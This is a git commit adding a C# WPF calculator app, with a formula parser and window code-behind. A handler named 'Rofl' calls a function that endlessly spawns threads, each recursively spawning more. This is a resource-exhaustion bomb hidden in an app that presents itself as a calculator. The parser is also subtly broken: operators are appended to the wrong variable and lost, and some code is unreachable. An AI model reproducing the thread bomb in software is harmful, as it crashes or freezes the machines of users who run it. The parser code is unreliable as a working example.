93aba1ad77cab7e2b8c1b08a5ea2430d95889855
Hallworld <prishedko.ilya@yandex.ru>
2025-04-08 18:53:37 +0300

    Добавьте файлы проекта.

---
+++ CALC/FormulaParser.cs
@@ -0,0 +1,103 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace CALC
+{
+    class FormulaParser
+    {
+        static string ConvertInfixToPostfix(string s)
+        {
+            if (s == null)
+                return "";
+
+            StringBuilder sb = new StringBuilder();
+
+            Stack<char> stack = new Stack<char>();
+            char[] opers = { '-', '+', '/', '*' };
+            char[] prior = { '/', '*' };
+            for (int i = 0; i < s.Length; i++)
+            {
+                char c = s[i];
+                if (c == '(')
+                    stack.Push(c);
+                else if ('0' <= c && c <= '9')
+                {
+                    for (; i < s.Length && '0' <= s[i] && s[i] <= '9'; i++)
+                        sb.Append(s[i]);
+
+                    i--;
+                    sb.Append(' ');
+                }
+                else if (c == ')')
+                {
+                    while (stack.Count > 0 && stack.Peek() != '(')
+                    {
+                        sb.Append(stack.Pop()).Append(" ");
+                    }
+                    stack.Pop();
+                }
+                else if (c == '+' || c == '-')
+                {
+                    while (stack.Count > 0 && opers.Contains(stack.Peek()))
+                        s.Append(stack.Pop()).Append(' ');
+                    stack.Push(c);
+                }
+                else if (prior.Contains(c))
+                {
+                    while (stack.Count > 0 && prior.Contains(stack.Peek()))
+                        s.Append(stack.Pop()).Append(' ');
+                    stack.Push(c);
+                }
+
+            }
+            while (stack.Count > 0)
+                sb.Append(stack.Pop()).Append(' ');
+            return sb.ToString().Trim();
+        }
+
+        static double DoOperation(string operation, string num1, string num2)
+        {
+            var n1 = double.Parse(num1);
+            var n2 = double.Parse(num2);
+            switch (operation)
+            {
+                case "-":
+                    return n1 - n2;
+                case "+":
+                    return n1 + n2;
+                case "*":
+                    return n1 * n2;
+                case "/":
+                    return n1 / n2;
+
+            }
+            throw new InvalidDataException(operation);
+            return 0;
+        }
+
+        public static string Calculate(string s)
+        {
+            var strs = ConvertInfixToPostfix(s).Split(' ');
+            string[] opers = { "+", "-", "/", "*" };
+            Stack<string> stack = new Stack<string>();
+            for (int i = 0; i < strs.Length; i++)
+            {
+                if (opers.Contains(strs[i]))
+                {
+                    var n1 = stack.Pop();
+                    var n2 = stack.Pop();
+                    stack.Push(DoOperation(strs[i], n2, n1).ToString());
+                }
+                else
+                {
+                    stack.Push(strs[i]);
+                }
+            }
+            return stack.Pop();
+        }
+    }
+}
---
+++ CALC/MainWindow.xaml.cs
@@ -0,0 +1,154 @@
+﻿using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Data;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Media.TextFormatting;
+using System.Windows.Navigation;
+using System.Windows.Shapes;
+
+namespace CALC
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        List<String> text;
+        int lastButton = 0; //0 - num, 1 - oper
+        bool dotClicked = false;
+        string[] opers = { "/", "*", "-", "+" };
+
+        public MainWindow()
+        {
+            InitializeComponent();
+            text = new List<string>();
+        }
+
+        private void NumClick(object sender, RoutedEventArgs e)
+        {
+            var b = (Button)sender;
+            if (lastButton == 0 && text.Count > 0)
+            {
+                text[text.Count - 1] += (string)b.Content;
+            }
+            else if (lastButton == 1 || text.Count == 0)
+            {
+                text.Add((string)b.Content);
+
+            }
+            lastButton = 0;
+            TextNum.Text = String.Join("", text);
+
+        }
+
+        private void ClickDot(object sender, RoutedEventArgs e)
+        {
+            if (dotClicked)
+                return;
+
+            text[text.Count - 1] += ',';
+            TextNum.Text = String.Join("", text);
+            dotClicked = true;
+            lastButton = 0;
+        }
+
+        private void SignClick(object sender, RoutedEventArgs e)
+        {
+
+
+            var b = (Button)sender;
+            if (lastButton == 0)
+                text.Add((string)b.Content);
+            else
+            {
+                text[text.Count - 1] = (string)b.Content;
+            }
+            lastButton = 1;
+            dotClicked = false;
+            TextNum.Text = String.Join("", text);
+
+        }
+
+
+        private void Clear(object sender, RoutedEventArgs e)
+        {
+            text.Clear();
+            lastButton = 0;
+            dotClicked = false;
+            TextNum.Text = "";
+
+        }
+
+        private void DelLast(object sender, RoutedEventArgs e)
+        {
+            if (text.Count == 0) return;
+
+            string c = text[text.Count - 1];
+            if (opers.Contains(c))
+            {
+                text.RemoveAt(text.Count - 1);
+                lastButton = 0;
+            }
+            else
+            {
+                var t = text[text.Count - 1];
+                text[text.Count - 1] = t.Substring(0, t.Length - 1);
+                if (text[text.Count - 1] == "")
+                {
+                    text.RemoveAt(text.Count - 1);
+                    if (text.Count > 0){
+                    t = text[text.Count - 1];
+                        if (opers.Contains(t))
+                            lastButton = 1;
+                        else
+                        {
+                            lastButton = 0;
+                            dotClicked = t.Contains(',');
+                        }
+                    }
+                }
+            }
+            TextNum.Text = string.Join("", text);
+        }
+
+        private void AddBraket(object sender, RoutedEventArgs e)
+        {
+            var b = (Button)sender;
+            text.Add((string)b.Content);
+            TextNum.Text = string.Join("", text);
+        }
+
+
+        private void ShowSum(object sender, RoutedEventArgs e)
+        {
+            var t = FormulaParser.Calculate(string.Join(" ", text));
+            Clear(sender, e);
+            TextNum.Text = t;
+        }
+
+        private void f(string s)
+        {
+            var r = new Random();
+            s += r.NextDouble().ToString();
+            for (int i = 0; i < int.MaxValue; i++)
+            {
+                s += r.NextDouble().ToString();
+                new Thread(() => { f(s); }).Start();
+                new Thread(() => { f(s); }).Start();
+            }
+        }
+
+        private void Rofl(object sender, RoutedEventArgs e)
+        {
+            f("");
+        }
+
+    }
+}
